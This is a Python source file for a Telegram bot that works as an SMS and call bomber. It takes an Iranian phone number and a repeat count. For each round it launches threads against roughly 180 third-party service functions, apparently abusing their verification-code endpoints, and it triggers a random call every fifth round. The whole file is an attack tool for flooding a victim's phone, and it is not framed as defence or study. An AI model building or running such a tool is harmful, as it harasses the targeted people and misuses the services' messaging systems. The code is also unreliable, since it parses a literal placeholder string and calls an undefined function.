import re
from flask import Flask, request
import telegram
from telebot.credentials import bot_token, bot_user_name,URL
from threading import Thread
from Api import sms, call
from time import sleep
from sys import exit
from os import system, name
from inspect import getmembers, isfunction 
from random import choice
import re

global bot
global TOKEN
TOKEN = bot_token
bot = telegram.Bot(token=TOKEN)

app = Flask(__name__)

sms_c = len(getmembers(sms, isfunction))
call_c = len(getmembers(call, isfunction))

def bombing(phone , xx):
    phone = f"+98{phone[1::]}"
    count = 1
    while count <= xx:
        Thread(target=sms.a4baz, args=[phone]).start()        
        Thread(target=sms.gharar, args=[phone]).start()
        Thread(target=sms.abantether, args=[phone]).start()
        Thread(target=sms.achar, args=[phone]).start()
        Thread(target=sms.alibaba, args=[phone]).start()
        Thread(target=sms.alinance, args=[phone]).start()
        Thread(target=sms.alopeyk, args=[phone]).start()
        Thread(target=sms.alopeyk_safir, args=[phone]).start()
        Thread(target=sms.amoomilad, args=[phone]).start()
        Thread(target=sms.anar, args=[phone]).start()
        Thread(target=sms.arka, args=[phone]).start()
        Thread(target=sms.arshiyan, args=[phone]).start()
        Thread(target=sms.ashraafi, args=[phone]).start()
        Thread(target=sms.azki, args=[phone]).start()
        Thread(target=sms.bahram_shop, args=[phone]).start()
        Thread(target=sms.balad, args=[phone]).start()
        Thread(target=sms.bama, args=[phone]).start()
        Thread(target=sms.banankala, args=[phone]).start()
        Thread(target=sms.bandarazad, args=[phone]).start()
        Thread(target=sms.banimode, args=[phone]).start()
        Thread(target=sms.basalam, args=[phone]).start()
        Thread(target=sms.baskol, args=[phone]).start()
        Thread(target=sms.bazidone, args=[phone]).start()
        Thread(target=sms.beheshticarpet, args=[phone]).start()
        Thread(target=sms.bigtoys, args=[phone]).start()
        Thread(target=sms.bimito, args=[phone]).start()
        Thread(target=sms.binjo, args=[phone]).start()
        Thread(target=sms.bit24, args=[phone]).start()
        Thread(target=sms.bitex24, args=[phone]).start()
        Thread(target=sms.candoosms, args=[phone]).start()
        Thread(target=sms.chamedoon, args=[phone]).start()
        Thread(target=sms.chaymarket, args=[phone]).start()
        Thread(target=sms.cinematicket, args=[phone]).start()
        Thread(target=sms.coffefastfoodluxury, args=[phone]).start()
        Thread(target=sms.dadhesab, args=[phone]).start()
        Thread(target=sms.dadpardaz, args=[phone]).start()
        Thread(target=sms.dastkhat, args=[phone]).start()
        Thread(target=sms.delino, args=[phone]).start()
        Thread(target=sms.devslop, args=[phone]).start()
        Thread(target=sms.deyfriedchicken, args=[phone]).start()
        Thread(target=sms.dicardo, args=[phone]).start()
        Thread(target=sms.didnegar, args=[phone]).start()
        Thread(target=sms.digikala, args=[phone]).start()
        Thread(target=sms.digikalajet, args=[phone]).start()
        Thread(target=sms.digipay, args=[phone]).start()
        Thread(target=sms.digistyle, args=[phone]).start()
        Thread(target=sms.divar, args=[phone]).start()
        Thread(target=sms.doctor, args=[phone]).start()
        Thread(target=sms.doctoreto, args=[phone]).start()
        Thread(target=sms.donergarden, args=[phone]).start()
        Thread(target=sms.dosma, args=[phone]).start()
        Thread(target=sms.drdr, args=[phone]).start()
        Thread(target=sms.drsaina, args=[phone]).start()
        Thread(target=sms.ehteraman, args=[phone]).start()
        Thread(target=sms.emtiaz, args=[phone]).start()
        Thread(target=sms.exo, args=[phone]).start()
        Thread(target=sms.express, args=[phone]).start()
        Thread(target=sms.farsgraphic, args=[phone]).start()
        Thread(target=sms.filmnet, args=[phone]).start()
        Thread(target=sms.flightio, args=[phone]).start()
        Thread(target=sms.foodbell, args=[phone]).start()
        Thread(target=sms.foodcenter, args=[phone]).start()
        Thread(target=sms.foodiran16, args=[phone]).start()
        Thread(target=sms.foodlandkish, args=[phone]).start()
        Thread(target=sms.gap, args=[phone]).start()
        Thread(target=sms.gapfilm, args=[phone]).start()
        Thread(target=sms.garcon, args=[phone]).start()
        Thread(target=sms.gelatohouse, args=[phone]).start()
        Thread(target=sms.ghabzino, args=[phone]).start()
        Thread(target=sms.ghasedak24, args=[phone]).start()
        Thread(target=sms.givernfood, args=[phone]).start()
        Thread(target=sms.glite, args=[phone]).start()
        Thread(target=sms.hamlex, args=[phone]).start()
        Thread(target=sms.hamrahbours, args=[phone]).start()
        Thread(target=sms.helsa, args=[phone]).start()
        Thread(target=sms.hemat, args=[phone]).start()
        Thread(target=sms.hiword, args=[phone]).start()
        Thread(target=sms.homtick, args=[phone]).start()
        Thread(target=sms.hyperjan, args=[phone]).start()
        Thread(target=sms.instagram, args=[phone]).start()
        Thread(target=sms.iranamlaak, args=[phone]).start()
        Thread(target=sms.iranicard, args=[phone]).start()
        Thread(target=sms.iranketab, args=[phone]).start()
        Thread(target=sms.irantic, args=[phone]).start()
        Thread(target=sms.irwco, args=[phone]).start()
        Thread(target=sms.itoll, args=[phone]).start()
        Thread(target=sms.kafegheymat, args=[phone]).start()
        Thread(target=sms.karchidari, args=[phone]).start()
        Thread(target=sms.kardoon, args=[phone]).start()
        Thread(target=sms.ketabchi, args=[phone]).start()
        Thread(target=sms.khanoumi, args=[phone]).start()
        Thread(target=sms.khodro45, args=[phone]).start()
        Thread(target=sms.kilid, args=[phone]).start()
        Thread(target=sms.kodakamoz, args=[phone]).start()
        Thread(target=sms.lendo, args=[phone]).start()
        Thread(target=sms.limome, args=[phone]).start()
        Thread(target=sms.mahiyekhoob, args=[phone]).start()
        Thread(target=sms.mamifood, args=[phone]).start()
        Thread(target=sms.mashinbank, args=[phone]).start()
        Thread(target=sms.mazoo, args=[phone]).start()
        Thread(target=sms.mci, args=[phone]).start()
        Thread(target=sms.mek, args=[phone]).start()
        Thread(target=sms.melix, args=[phone]).start()
        Thread(target=sms.miare, args=[phone]).start()
        Thread(target=sms.mihanpezeshk, args=[phone]).start()
        Thread(target=sms.mipersia, args=[phone]).start()
        Thread(target=sms.mobogift, args=[phone]).start()
        Thread(target=sms.moshaveran724, args=[phone]).start()
        Thread(target=sms.namava, args=[phone]).start()
        Thread(target=sms.nesengrill, args=[phone]).start()
        Thread(target=sms.nobat, args=[phone]).start()
        Thread(target=sms.novinbook, args=[phone]).start()
        Thread(target=sms.offch, args=[phone]).start()
        Thread(target=sms.offdecor, args=[phone]).start()
        Thread(target=sms.okcs, args=[phone]).start()
        Thread(target=sms.okorosh, args=[phone]).start()
        Thread(target=sms.olgoo, args=[phone]).start()
        Thread(target=sms.opco, args=[phone]).start()
        Thread(target=sms.ostadkr, args=[phone]).start()
        Thread(target=sms.otaghak, args=[phone]).start()
        Thread(target=sms.pakhsh, args=[phone]).start()
        Thread(target=sms.paklean, args=[phone]).start()
        Thread(target=sms.paymishe, args=[phone]).start()
        Thread(target=sms.pezeshket, args=[phone]).start()
        Thread(target=sms.pinket, args=[phone]).start()
        Thread(target=sms.pirankalaco, args=[phone]).start()
        Thread(target=sms.pizzapanjereh, args=[phone]).start()
        Thread(target=sms.podro, args=[phone]).start()
        Thread(target=sms.pubgsell, args=[phone]).start()
        Thread(target=sms.pubisha, args=[phone]).start()
        Thread(target=sms.raminashop, args=[phone]).start()
        Thread(target=sms.rayshomar, args=[phone]).start()
        Thread(target=sms.refahtea, args=[phone]).start()
        Thread(target=sms.rojashop, args=[phone]).start()
        Thread(target=sms.rokla, args=[phone]).start()
        Thread(target=sms.rubika, args=[phone]).start()
        Thread(target=sms.sTrip, args=[phone]).start()
        Thread(target=sms.sabziman, args=[phone]).start()
        Thread(target=sms.safiran, args=[phone]).start()
        Thread(target=sms.see5, args=[phone]).start()
        Thread(target=sms.seebirani, args=[phone]).start()
        Thread(target=sms.shab, args=[phone]).start()
        Thread(target=sms.shad, args=[phone]).start()
        Thread(target=sms.shahrfarsh, args=[phone]).start()
        Thread(target=sms.shahrhayejadid, args=[phone]).start()
        Thread(target=sms.shandiz, args=[phone]).start()
        Thread(target=sms.sheypoor, args=[phone]).start()
        Thread(target=sms.shop_mci, args=[phone]).start()
        Thread(target=sms.sibbank, args=[phone]).start()
        Thread(target=sms.sibbazar, args=[phone]).start()
        Thread(target=sms.simkhanF, args=[phone]).start()
        Thread(target=sms.simkhanT, args=[phone]).start()
        Thread(target=sms.sizdah50, args=[phone]).start()
        Thread(target=sms.smarket, args=[phone]).start()
        Thread(target=sms.snap, args=[phone]).start()
        Thread(target=sms.snapfood, args=[phone]).start()
        Thread(target=sms.snapp, args=[phone]).start()
        Thread(target=sms.snapp_drivers, args=[phone]).start()
        Thread(target=sms.snapp_link, args=[phone]).start()
        Thread(target=sms.steelalborz, args=[phone]).start()
        Thread(target=sms.taghche, args=[phone]).start()
        Thread(target=sms.tajtehran, args=[phone]).start()
        Thread(target=sms.takfarsh, args=[phone]).start()
        Thread(target=sms.tamland, args=[phone]).start()
        Thread(target=sms.tap30, args=[phone]).start()
        Thread(target=sms.tapsi, args=[phone]).start()
        Thread(target=sms.tikban, args=[phone]).start()
        Thread(target=sms.timcheh, args=[phone]).start()
        Thread(target=sms.tj8, args=[phone]).start()
        Thread(target=sms.tmg, args=[phone]).start()
        Thread(target=sms.tnovin, args=[phone]).start()
        Thread(target=sms.topnoor, args=[phone]).start()
        Thread(target=sms.torob, args=[phone]).start()
        Thread(target=sms.uphone, args=[phone]).start()
        Thread(target=sms.virgool, args=[phone]).start()
        Thread(target=sms.watchonline, args=[phone]).start()
        Thread(target=sms.wis, args=[phone]).start()
        Thread(target=sms.zerocafe, args=[phone]).start()
        Thread(target=sms.zivanpet, args=[phone]).start()
        print(f"\033[1m\033[96mRound \033[1;31m{count} \033[1m\033[96mCompleted")
        if (count % 5) == 0:
           rnd_call = choice([call.ragham_call,call.paklean_call,call.novinbook_call,call.azki_call])
           Thread(target=rnd_call, args=[phone]).start()
        count += 1
        sleep(0.2)
    printLow(f"\033[32;1m[\033[1;33mFinished\033[32;1m]")
    exit()



@app.route('/{}'.format(TOKEN), methods=['POST'])
def respond():
   # retrieve the message in JSON and then transform it to Telegram object
   update = telegram.Update.de_json(request.get_json(force=True), bot)

   chat_id = update.message.chat.id
   msg_id = update.message.message_id

   # Telegram understands UTF-8, so encode text for unicode compatibility
   text = update.message.text.encode('utf-8').decode()

   # the first time you chat with the bot AKA the welcoming message
   if text == "/start":
       # print the welcoming message
       bot_welcome = """
        سلام لطفا شماره موبایل را به صورت زیر بفرست و با / تعداد بارهای اسپم رو بفرست
        مثلا:
        09122345678/100
       """
       # send the welcoming message
       bot.sendMessage(chat_id=chat_id, text=bot_welcome, reply_to_message_id=msg_id)
   
   else:
       try:

          input_string = "text"

          # استخراج شماره تلفن
          number_match = re.search(r'\d{11}', input_string)
          if number_match:
              number = number_match.group()
          else:
              number = None
      
          # استخراج yy
          yy_match = re.search(r'/(?P<yy>\d+)$', input_string)
          if yy_match:
              yy = int(yy_match.group('yy'))
          else:
              yy = None

          bombing(phone=number_match.group(),xx=yy_match.group('yy'))


          
       except Exception:
           bot.sendMessage(chat_id=chat_id, text="یک مشکلی در انجام عملیات رخ داده", reply_to_message_id=msg_id)

   return 'ok'

@app.route('/set_webhook', methods=['GET', 'POST'])
def set_webhook():
   s = bot.setWebhook('{URL}{HOOK}'.format(URL=URL, HOOK=TOKEN))
   if s:
       return "webhook setup ok"
   else:
       return "webhook setup failed"

@app.route('/')
def index():
   return '.'


if __name__ == '__main__':
   app.run(threaded=True)